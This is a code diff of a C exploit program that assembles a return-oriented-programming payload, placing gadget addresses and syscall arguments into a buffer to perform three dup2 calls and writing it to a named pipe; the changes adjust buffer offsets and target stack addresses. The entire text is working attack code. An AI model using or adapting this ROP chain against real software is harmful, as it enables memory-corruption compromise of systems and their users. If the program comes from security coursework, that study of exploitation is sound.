@@ -70,14 +70,14 @@ int main(void)
   // dup2 syscalls 0xbfbf671d
   char dup_arg_seed[] = "\x62\x01\x01\x01";
   // #1 
-  char dup_call_3_addr[] = "\xf8\x68\xbf\xbf"; // bufr + 475, 
-  char dup_call_arg_addr[] = "\xfc\x68\xbf\xbf"; // bufr + 479, 
+  char dup_call_3_addr[] = "\x10\x69\xbf\xbf"; // bufr + 499, 
+  char dup_call_arg_addr[] = "\x14\x68\xbf\xbf"; // bufr + 503, 
   // #2
-  char dup_call2_3_addr[] = "\x18\x69\xbf\xbf"; //bufr + 507, 
-  char dup_call2_arg_addr[] = "\x1c\x69\xbf\xbf"; //bufr + 511, 
+  char dup_call2_3_addr[] = "\x30\x69\xbf\xbf"; //bufr + 531, 
+  char dup_call2_arg_addr[] = "\x34\x69\xbf\xbf"; //bufr + 535, 
   // #3
-  char dup_call3_3_addr[] = "\x38\x69\xbf\xbf"; // bufr + 539, 
-  char dup_call3_arg_addr[] = "\x3c\x69\xbf\xbf"; // bufr + 543, 
+  char dup_call3_3_addr[] = "\x50\x69\xbf\xbf"; // bufr + 563, 
+  char dup_call3_arg_addr[] = "\x54\x69\xbf\xbf"; // bufr + 567, 
 
 
   int i;
@@ -217,12 +217,12 @@ int main(void)
   strcpy(bufr + 411, dup_call_arg_addr); // -> 0xbfbf68f8
   strcpy(bufr + 415, write_at_ecx_from_edx); // 0xbbb6b87e
   // pop off second arg address into ecx
-  strcpy(bufr + 419, inc_edx); //  // 0xbbb7b88a, edx has 1
+  strcpy(bufr + 419, inc_edx); // 0xbbb7b88a, edx has 1
   strcpy(bufr + 423, pop_ecx); // 0xbbaa422
   strcpy(bufr + 427, dup_call2_arg_addr); // -> 0xbfbf6c28
   strcpy(bufr + 431, write_at_ecx_from_edx); // 0xbbb6b87e
   // pop off third arg address into ecx
-  strcpy(bufr + 435, inc_edx); //  // 0xbbb7b88a, edx has 2
+  strcpy(bufr + 435, inc_edx); //  0xbbb7b88a, edx has 2
   strcpy(bufr + 439, pop_ecx); // 0xbbaa422
   strcpy(bufr + 443, dup_call3_arg_addr);
   strcpy(bufr + 447, write_at_ecx_from_edx); // 0xbbb6b87e
@@ -233,50 +233,50 @@ int main(void)
   strcpy(bufr + 459, dup_call_3_addr);
   strcpy(bufr + 463, write_at_ecx_from_edx); // 0xbbb6b87e
   // pop second 3 arg address into ecx
-  strcpy(bufr + 455, pop_ecx); // 0xbbaa422
-  strcpy(bufr + 459, dup_call2_3_addr);
-  strcpy(bufr + 463, write_at_ecx_from_edx); // 0xbbb6b87e
+  strcpy(bufr + 467, pop_ecx); // 0xbbaa422
+  strcpy(bufr + 471, dup_call2_3_addr);
+  strcpy(bufr + 475, write_at_ecx_from_edx); // 0xbbb6b87e
   // pop third 3 arg address into ecx
-  strcpy(bufr + 455, pop_ecx); // 0xbbaa422
-  strcpy(bufr + 459, dup_call3_3_addr);
-  strcpy(bufr + 463, write_at_ecx_from_edx); // 0xbbb6b87e
+  strcpy(bufr + 479, pop_ecx); // 0xbbaa422
+  strcpy(bufr + 483, dup_call3_3_addr);
+  strcpy(bufr + 487, write_at_ecx_from_edx); // 0xbbb6b87e
                                             // all 3 dup2 should have proper file descriptor
+  // x/24x 0xbfbf68f0
   // ---------------------------------------------------------- call #1 0xbfbf671d
-  strcpy(bufr + 467, trap); // 0xbba9b6e5, location is 0xbfbf68f0
-  strcpy(bufr + 471, jump_8); // 0xbbb2d3e2
+  strcpy(bufr + 491, trap); // 0xbba9b6e5, location is 0xbfbf68f0
+  strcpy(bufr + 495, jump_8); // 0xbbb2d3e2
   // 4 byte value 3
-  strcpy(bufr + 475, "\x01\x01\x01\x01");
+  strcpy(bufr + 499, "\x01\x01\x01\x01");
   // 4 byte value 0
-  strcpy(bufr + 479, "\x01\x01\x01\x01");
+  strcpy(bufr + 503, "\x01\x01\x01\x01");
   // ---------------------------------------------------------- call #2
-  strcpy(bufr + 483, xor_eax); // 0xbba9b3c2
+  strcpy(bufr + 507, xor_eax); // 0xbba9b3c2
   // put seed into edx
-  strcpy(bufr + 487, pop_edx); // 0xbbb9dc1b
-  strcpy(bufr + 491, dup_arg_seed);
+  strcpy(bufr + 511, pop_edx); // 0xbbb9dc1b
+  strcpy(bufr + 515, dup_arg_seed);
   // add first 8 bits to eax
-  strcpy(bufr + 495, add_dl_al); // 0xbbbb4607
+  strcpy(bufr + 519, add_dl_al); // 0xbbbb4607
                                 // eax should hold 98, 0x62
-  strcpy(bufr + 499, trap); // 0xbba9b6e5, location is 0xbfbf6900
-  strcpy(bufr + 503, jump_8); // 0xbbb2d3e2
+  strcpy(bufr + 523, trap); // 0xbba9b6e5, location is 0xbfbf6928
+  strcpy(bufr + 527, jump_8); // 0xbbb2d3e2
   // 4 byte value 3
-  strcpy(bufr + 507, "\x01\x01\x01\x01");
+  strcpy(bufr + 531, "\x01\x01\x01\x01");
   // 4 byte value 1
-  strcpy(bufr + 511, "\x01\x01\x01\x01");
+  strcpy(bufr + 535, "\x01\x01\x01\x01");
   // ---------------------------------------------------------- call #3
-  strcpy(bufr + 515, xor_eax); // 0xbba9b3c2
+  strcpy(bufr + 539, xor_eax); // 0xbba9b3c2
   // put seed into edx
-  strcpy(bufr + 519, pop_edx); // 0xbbb9dc1b
-  strcpy(bufr + 523, dup_arg_seed);
+  strcpy(bufr + 543, pop_edx); // 0xbbb9dc1b
+  strcpy(bufr + 547, dup_arg_seed);
   // add first 8 bits to eax
-  strcpy(bufr + 527, add_dl_al); // 0xbbbb4607
+  strcpy(bufr + 551, add_dl_al); // 0xbbbb4607
                                 // eax should hold 98, 0x62
-  strcpy(bufr + 531, trap); // 0xbba9b6e5, location is 0xbfbf6910
-  strcpy(bufr + 535, jump_8); // 0xbbb2d3e2
+  strcpy(bufr + 555, trap); // 0xbba9b6e5, location is 0xbfbf6948
+  strcpy(bufr + 559, jump_8); // 0xbbb2d3e2
   // 4 byte value 3
-  strcpy(bufr + 539, "\x01\x01\x01\x01");
+  strcpy(bufr + 563, "\x01\x01\x01\x01");
   // 4 byte value 2
-  strcpy(bufr + 543, "\x01\x01\x01\x01");
-
+  strcpy(bufr + 567, "\x01\x01\x01\x01");
 
   writecmd(PIPEPATH, bufr);
   
